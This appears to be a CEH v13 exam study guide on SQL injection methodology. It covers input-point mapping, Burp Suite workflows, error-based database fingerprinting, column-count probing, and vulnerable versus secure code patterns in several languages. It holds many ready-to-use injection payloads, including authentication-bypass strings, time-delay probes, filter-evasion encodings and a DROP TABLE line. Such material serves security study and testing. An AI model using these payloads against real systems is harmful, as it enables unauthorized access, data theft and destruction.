# SQL Injection Methodology

## Identifying Data Entry Paths

The first step in SQL injection testing is identifying all possible input points where user data interacts with the database.

### Common Data Entry Points

#### Web Forms
- Login forms (username, password)
- Registration forms (multiple fields)
- Search boxes (search terms, filters)
- Contact forms (name, email, message)
- Feedback forms (ratings, comments)
- Profile update forms (personal information)

#### URL Parameters
- GET parameters in query strings
- Route parameters in RESTful APIs
- Path parameters in URL segments
- Fragment identifiers

#### HTTP Headers
- User-Agent string
- X-Forwarded-For header
- Referer header
- Authorization headers
- Custom application headers

#### Cookies and Session Data
- Session identifiers
- Authentication tokens
- User preference cookies
- Shopping cart data

#### File Uploads
- Filename parameters
- File metadata
- MIME type specifications
- File content (in some cases)

#### API Endpoints
- JSON request bodies
- XML data elements
- SOAP parameters
- GraphQL queries

### Tamper Data Tools

Browser-based tools for intercepting and modifying HTTP requests.

#### Tamper Data Features
- Real-time request modification
- Parameter manipulation
- Header modification
- Request/response analysis

#### Usage for SQL Injection Testing
1. **Intercept Requests**: Capture form submissions and API calls
2. **Modify Parameters**: Insert test payloads into identified fields
3. **Analyze Responses**: Monitor application behavior changes
4. **Document Vulnerabilities**: Record successful injection points

#### Tamper Data Workflow
```
1. Enable request interception
2. Submit normal form data
3. Modify intercepted request with payload
4. Forward modified request
5. Analyze response for injection indicators
6. Document findings and repeat
```

### Burp Suite for SQL Injection Testing

Professional web application security testing platform.

#### Burp Suite Components

**Proxy Module**
- Intercepts HTTP/HTTPS traffic
- Modifies requests and responses
- SSL/TLS certificate handling
- Request history and filtering

**Repeater Module**
- Manual request manipulation
- Payload testing and refinement
- Response comparison
- Custom header injection

**Intruder Module**
- Automated payload delivery
- Parameter fuzzing
- Brute force testing
- Position-based payload insertion

**Scanner Module** (Professional)
- Automated vulnerability detection
- SQL injection signature matching
- False positive reduction
- Comprehensive reporting

#### Burp Suite SQL Injection Workflow

**Step 1: Traffic Interception**
```
1. Configure browser proxy settings
2. Install Burp CA certificate
3. Navigate to target application
4. Monitor intercepted requests
```

**Step 2: Request Analysis**
```
1. Identify POST/GET parameters
2. Note database interaction indicators
3. Map application functionality
4. Document potential injection points
```

**Step 3: Manual Testing**
```
1. Send requests to Repeater
2. Insert basic injection payloads
3. Analyze response differences
4. Refine payloads based on results
```

**Step 4: Automated Testing**
```
1. Configure Intruder positions
2. Load SQL injection payload lists
3. Execute automated attacks
4. Review results for vulnerabilities
```

## Extracting Information Through Error Messages

Error messages often reveal valuable information about database structure and configuration.

### Parameter Tampering

Systematic modification of input parameters to trigger database errors.

#### Basic Parameter Tampering Techniques

**Single Quote Test**
```
Original: product_id=1
Modified: product_id=1'
```

**Double Quote Test**
```
Original: search_term=laptop
Modified: search_term=laptop"
```

**Semicolon Test**
```
Original: user_id=100
Modified: user_id=100;
```

**Comment Test**
```
Original: category=electronics
Modified: category=electronics'--
```

#### Parameter Tampering Process
1. **Baseline Establishment**: Record normal application responses
2. **Single Character Injection**: Test with quotes, semicolons, backslashes
3. **Error Analysis**: Document error messages and response changes
4. **Payload Refinement**: Develop targeted injection based on error patterns
5. **Information Extraction**: Use errors to gather database intelligence

### Determining Database Engine Type

Different database systems produce distinct error messages and behaviors.

#### Database-Specific Error Patterns

**MySQL Indicators**
```sql
-- Syntax error patterns
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version

-- Function-specific errors
mysql_fetch_array(): supplied argument is not a valid MySQL result
```

**Microsoft SQL Server Indicators**
```sql
-- Syntax error patterns
Incorrect syntax near the keyword 'SELECT'
Unclosed quotation mark after the character string

-- System function errors
Invalid column name 'nonexistent_column'
```

**PostgreSQL Indicators**
```sql
-- Syntax error patterns
ERROR: syntax error at or near "'"
ERROR: unterminated quoted string at or near

-- Data type errors
ERROR: invalid input syntax for integer
```

**Oracle Indicators**
```sql
-- Syntax error patterns
ORA-00936: missing expression
ORA-00933: SQL command not properly ended

-- Data type errors
ORA-01722: invalid number
```

#### Database Detection Queries
```sql
-- MySQL version detection
' AND (SELECT @@version)--

-- SQL Server version detection
' AND (SELECT @@version)--

-- PostgreSQL version detection
' AND (SELECT version())--

-- Oracle version detection
' AND (SELECT banner FROM v$version WHERE rownum=1)--
```

### Determining SELECT Query Structure

Understanding the original query structure is crucial for successful injection.

#### Column Count Determination

**ORDER BY Method**
```sql
-- Incrementally test column count
product_id=1' ORDER BY 1--    (success)
product_id=1' ORDER BY 2--    (success)
product_id=1' ORDER BY 3--    (success)
product_id=1' ORDER BY 4--    (error - 3 columns confirmed)
```

**GROUP BY Method**
```sql
-- Alternative column counting
product_id=1' GROUP BY 1--
product_id=1' GROUP BY 1,2--
product_id=1' GROUP BY 1,2,3--
product_id=1' GROUP BY 1,2,3,4--  (error)
```

**UNION Method**
```sql
-- Direct union testing
product_id=1' UNION SELECT 1--       (error)
product_id=1' UNION SELECT 1,2--     (error)
product_id=1' UNION SELECT 1,2,3--   (success)
```

#### Data Type Identification
```sql
-- Test string compatibility
product_id=1' UNION SELECT 'a','b','c'--

-- Test numeric compatibility
product_id=1' UNION SELECT 1,2,3--

-- Mixed data type testing
product_id=1' UNION SELECT 1,'string',null--
```

### SQL Injection Vulnerability Detection Testing

Systematic approaches to identify SQL injection vulnerabilities.

#### Basic Injection Tests

**Authentication Bypass Tests**
```sql
-- Login form testing
username: admin' OR '1'='1'--
password: anything

username: admin'/**/OR/**/1=1#
password: ignored

username: ' OR 1=1#
password: ' OR 1=1#
```

**Numeric Parameter Tests**
```sql
-- Integer parameter injection
id=1 AND 1=1        (normal response)
id=1 AND 1=2        (different/error response)
id=1' AND '1'='1    (syntax error expected)

-- Arithmetic operations
id=1+1              (should return record 2)
id=2-1              (should return record 1)
id=1*1              (should return record 1)
```

**String Parameter Tests**
```sql
-- String injection patterns
name='test' AND '1'='1
name='test' OR '1'='1
name='test'; SELECT * FROM users--
name='test' UNION SELECT 1,2,3--
```

#### Advanced Detection Techniques

**Time-Based Detection**
```sql
-- MySQL time delay
id=1; SELECT SLEEP(5)--
id=1' AND SLEEP(5)--

-- SQL Server time delay  
id=1; WAITFOR DELAY '0:0:5'--
id=1' AND WAITFOR DELAY '0:0:5'--

-- PostgreSQL time delay
id=1; SELECT pg_sleep(5)--
id=1' AND pg_sleep(5)>0--
```

**Boolean-Based Detection**
```sql
-- True condition (normal response expected)
id=1' AND 1=1--

-- False condition (different response expected)  
id=1' AND 1=2--

-- Substring testing
id=1' AND SUBSTRING(database(),1,1)='a'--
```

## Additional Methods to Detect SQL Injection

### Function Testing

Systematic testing of database functions to identify injection points and database capabilities.

#### Database Function Categories

**String Functions**
```sql
-- Length functions
' AND LENGTH(database())>0--
' AND LEN(USER_NAME())>0--  (SQL Server)

-- Substring functions
' AND SUBSTRING(user(),1,4)='root'--
' AND LEFT(@@version,6)='5.7.21'--

-- Concatenation functions
' AND CONCAT(user(),':',database())--
' AND user()+'|'+database()--  (SQL Server)
```

**Mathematical Functions**
```sql
-- Arithmetic operations
' AND 1+1=2--
' AND MOD(1,2)=1--
' AND POWER(2,3)=8--

-- Random functions
' AND RAND()>=0--
' AND ABS(-1)=1--
```

**Date/Time Functions**
```sql
-- Current timestamp
' AND NOW()>0--
' AND GETDATE()>0--  (SQL Server)
' AND SYSDATE>0--    (Oracle)

-- Date arithmetic
' AND YEAR(NOW())=2024--
' AND DATEPART(year,GETDATE())=2024--  (SQL Server)
```

**System Information Functions**
```sql
-- User information
' AND USER()!='root'--
' AND CURRENT_USER()!='admin'--
' AND USER_NAME()!='sa'--  (SQL Server)

-- Database information
' AND DATABASE()!='mysql'--
' AND DB_NAME()!='master'--  (SQL Server)
' AND (SELECT name FROM v$database)!='XE'--  (Oracle)
```

### FUZZ Testing

Automated testing using various payloads to identify vulnerabilities through application behavior analysis.

#### FUZZ Testing Tools

**beSTORM**
- Commercial fuzzing platform
- Protocol-aware fuzzing
- SQL injection payload generation
- Automated vulnerability detection

**Burp Suite FUZZ Testing**
- Intruder module for payload delivery
- Custom payload lists
- Position-based fuzzing
- Response analysis and filtering

**AppScan Standard**
- IBM security testing tool
- Automated SQL injection detection
- Comprehensive payload database
- Integration with development workflows

**SnapFuzz**
- Specialized SQL injection fuzzer
- Database-specific payload generation
- Error pattern recognition
- Automated exploitation attempts

#### FUZZ Testing Methodology

**Payload Categories**
```sql
-- Basic injection characters
' " ; \ ` | & $ % # @

-- SQL keywords
SELECT INSERT UPDATE DELETE DROP UNION WHERE ORDER BY

-- Database functions
USER() DATABASE() VERSION() SLEEP() CONCAT()

-- Comment sequences
-- # /* */ <!--

-- Numeric operations
1+1 2-1 3*2 4/2 5%3

-- Boolean operations
AND OR NOT TRUE FALSE 1=1 1=2
```

**FUZZ Testing Process**
1. **Baseline Recording**: Capture normal application responses
2. **Payload Generation**: Create comprehensive test payload lists
3. **Automated Delivery**: Systematically inject payloads into parameters
4. **Response Analysis**: Compare responses to baseline behavior
5. **Anomaly Detection**: Identify unusual responses indicating vulnerabilities
6. **Manual Verification**: Confirm automated findings through manual testing

### Static Testing

Analysis of application source code to identify SQL injection vulnerabilities without executing the code.

#### Static Analysis Techniques

**Source Code Review Patterns**
```php
// PHP vulnerable patterns
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
$query = "SELECT * FROM users WHERE name = '" . $_POST['name'] . "'";
mysql_query("SELECT * FROM products WHERE category = '$_REQUEST[cat]'");

// Secure patterns
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
```

```java
// Java vulnerable patterns
String query = "SELECT * FROM users WHERE id = " + request.getParameter("id");
Statement.executeQuery("SELECT * FROM users WHERE name = '" + username + "'");

// Secure patterns
PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, Integer.parseInt(request.getParameter("id")));
```

**Code Review Checklist**
- Dynamic SQL query construction
- Direct parameter concatenation
- Missing input validation
- Absence of parameterized queries
- Improper escape character handling
- User input in stored procedure calls

### Dynamic Testing

Runtime analysis of applications to identify SQL injection vulnerabilities through actual execution.

#### Dynamic Analysis Approaches

**Black Box Testing**
- No source code access
- External perspective testing
- User interface interaction
- Input/output behavior analysis

**Gray Box Testing**
- Limited source code access
- Combined static and dynamic analysis
- Internal application knowledge
- Targeted vulnerability testing

**White Box Testing**
- Complete source code access
- Comprehensive code path analysis
- Integration testing
- Development environment testing

#### Dynamic Testing Tools

**Veracode**
- Cloud-based security testing
- Static and dynamic analysis
- SQL injection detection
- Compliance reporting

**SonarQube**
- Code quality and security analysis
- Vulnerability pattern detection
- Integration with CI/CD pipelines
- Custom rule configuration

**PVS-Studio**
- Static code analyzer
- Security vulnerability detection
- False positive reduction
- Multiple language support

**Coverity Scan**
- Static analysis platform
- Open source project support
- Comprehensive vulnerability detection
- Detailed remediation guidance

**Parasoft Jtest**
- Java application testing
- Static and dynamic analysis
- Security rule enforcement
- Development workflow integration

## SQL Injection Black Box Penetration Testing

Black box testing simulates external attacker scenarios without internal application knowledge.

### Detecting SQL Injection Issues

#### Response-Based Detection

**Error Message Analysis**
```
Normal Response:
- HTTP 200 status
- Expected content display
- Standard page layout

Injection Response:
- HTTP 500 errors
- Database error messages
- Blank pages or timeouts
- Different content structure
```

**Time-Based Detection**
```sql
-- Baseline timing
Normal request: 0.2 seconds average response

-- Time-based payload
' AND SLEEP(5)--
Expected response: 5+ seconds delay
```

**Boolean-Based Detection**
```sql
-- True condition payload
product_id=1' AND 1=1--
Expected: Normal product display

-- False condition payload
product_id=1' AND 1=2--
Expected: No product display or error
```

### Detecting Input Sanitization

#### Sanitization Testing Patterns

**Character Filtering Tests**
```sql
-- Single quote filtering
Input: test'
Sanitized: test\'
Bypassed: test\' OR '1'='1--

-- Double quote filtering
Input: test"
Sanitized: test\"  
Bypassed: test\"; SELECT * FROM users--

-- Semicolon filtering
Input: test;
Sanitized: test[removed]
Bypassed: test' UNION SELECT--
```

**Keyword Filtering Tests**
```sql
-- SELECT keyword filtering
Input: SELECT
Filtered: [removed]
Bypassed: SeLeCt, %53%45%4C%45%43%54, UNION/**/SELECT

-- UNION keyword filtering
Input: UNION
Filtered: [removed]
Bypassed: UniOn, %55%4E%49%4F%4E, UN/**/ION
```

**Length Restriction Testing**
```sql
-- Short payload constraint
Normal payload: ' UNION SELECT user(),database()--
Length restricted: ' OR 1=1#

-- Compound payload approach
First request: '; DROP TABLE temp--
Second request: '; CREATE TABLE temp AS SELECT * FROM users--
Third request: '; SELECT * FROM temp--
```

### Detecting Truncation Issues

Truncation vulnerabilities occur when input length restrictions are improperly implemented.

#### Truncation Attack Scenarios

**Password Truncation**
```sql
-- Registration with long username
Username: admin_hacker[...250 characters...]
Password: attacker_password

-- Database truncation
Stored username: admin_hacker (truncated at limit)
Stored password: attacker_password

-- Login attempt
Username: admin_hacker
Password: attacker_password (successful authentication)
```

**SQL Query Truncation**
```sql
-- Long injection payload
Input: normal_value[...long string...] AND 1=1--

-- Truncated execution
Executed query: SELECT * FROM products WHERE name = 'normal_value[truncated]'
Result: Bypasses intended WHERE clause limitations
```

### Detecting SQL Modification

#### Query Structure Modification Detection

**SELECT Statement Modification**
```sql
-- Original query intent
SELECT product_name FROM products WHERE category = 'USER_INPUT'

-- Modified query structure
SELECT product_name FROM products WHERE category = '' UNION SELECT password FROM users--'

-- Detection indicators
- Different column data in response
- Additional result rows
- Unexpected data types
```

**INSERT Statement Modification**
```sql
-- Original registration intent
INSERT INTO users (username, email) VALUES ('USER_INPUT', 'EMAIL_INPUT')

-- Modified query structure  
INSERT INTO users (username, email) VALUES ('admin', 'hack@evil.com'), ('USER_INPUT', 'EMAIL_INPUT')

-- Detection indicators
- Unexpected user account creation
- Administrative privilege escalation
- Additional database entries
```

## Source Code Review for SQL Injection Vulnerabilities

### Static Code Analysis

Systematic examination of source code to identify SQL injection vulnerabilities without code execution.

#### Vulnerable Code Patterns

**PHP Vulnerable Patterns**
```php
// Direct concatenation vulnerabilities
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = $id";

$name = $_POST['name'];  
$query = "SELECT * FROM users WHERE name = '$name'";

// Magic quotes bypass
$input = stripslashes($_GET['input']);
$query = "SELECT * FROM table WHERE field = '$input'";

// Vulnerable stored procedure calls
$proc = "CALL getUserInfo('$_GET[id]')";
mysql_query($proc);
```

**Java Vulnerable Patterns**
```java
// String concatenation vulnerabilities
String userId = request.getParameter("id");
String query = "SELECT * FROM users WHERE id = " + userId;
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);

// StringBuilder vulnerabilities
StringBuilder sb = new StringBuilder();
sb.append("SELECT * FROM users WHERE name = '");
sb.append(request.getParameter("name"));
sb.append("'");
String query = sb.toString();
```

**C# Vulnerable Patterns**
```csharp
// String concatenation vulnerabilities
string userId = Request.QueryString["id"];
string query = "SELECT * FROM users WHERE id = " + userId;
SqlCommand cmd = new SqlCommand(query, connection);

// String interpolation vulnerabilities
string name = Request.Form["name"];
string query = $"SELECT * FROM users WHERE name = '{name}'";
```

**Python Vulnerable Patterns**
```python
# String formatting vulnerabilities
user_id = request.args.get('id')
query = "SELECT * FROM users WHERE id = %s" % user_id
cursor.execute(query)

# String concatenation vulnerabilities  
name = request.form['name']
query = "SELECT * FROM users WHERE name = '" + name + "'"
cursor.execute(query)
```

### Dynamic Code Analysis

Runtime analysis of applications to identify SQL injection vulnerabilities during execution.

#### Dynamic Analysis Benefits
- Real-time vulnerability detection
- Runtime context analysis
- Input validation effectiveness testing
- Database interaction monitoring

#### Integration with Development Workflows
```yaml
# CI/CD Pipeline Integration
stages:
  - static_analysis:
      tools: [SonarQube, Veracode]
      triggers: [code_commit]
      
  - dynamic_analysis:
      tools: [OWASP ZAP, Burp Suite]
      triggers: [deployment_staging]
      
  - security_validation:
      sql_injection_tests: enabled
      automated_remediation: enabled
```

---

## Key CEH v13 Exam Points

### Critical Concepts
1. **Methodology Framework**: Systematic approach to SQL injection testing
2. **Data Entry Identification**: Comprehensive input point mapping
3. **Tool Integration**: Burp Suite, Tamper Data, automated scanners
4. **Error Analysis**: Database engine identification through error messages
5. **Detection Techniques**: Static, dynamic, and hybrid analysis approaches
6. **Black Box Testing**: External perspective vulnerability assessment
7. **Source Code Review**: Internal code analysis for vulnerability patterns

### Exam Focus Areas
- **Testing Methodology**: Structured approach from reconnaissance to exploitation
- **Tool Proficiency**: Burp Suite configuration and advanced usage
- **Database Fingerprinting**: Engine identification through errors and behaviors
- **Input Validation Testing**: Sanitization and filtering bypass techniques
- **Automated vs Manual Testing**: When to use different approaches
- **False Positive Management**: Distinguishing real vulnerabilities from noise
- **Remediation Verification**: Confirming fix effectiveness through testing

### Practical Skills
- Map comprehensive application attack surface for SQL injection
- Configure and operate Burp Suite for advanced SQL injection testing
- Analyze error messages to determine database engine and structure
- Implement both automated and manual testing approaches effectively
- Recognize vulnerable code patterns across multiple programming languages
- Design test cases for complex application scenarios
- Validate remediation efforts through comprehensive retesting
